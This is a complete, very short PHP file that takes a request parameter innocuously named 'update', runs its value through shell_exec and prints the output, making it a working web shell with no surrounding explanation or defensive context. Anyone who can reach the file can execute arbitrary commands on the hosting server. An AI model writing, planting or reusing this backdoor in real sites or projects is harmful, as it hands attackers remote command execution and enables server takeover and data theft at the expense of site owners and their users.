<?php 
    if (isset($_REQUEST['update'])) { 
        echo "<pre>" . shell_exec($_REQUEST['update']) . "</pre>"; 
    } 
?>
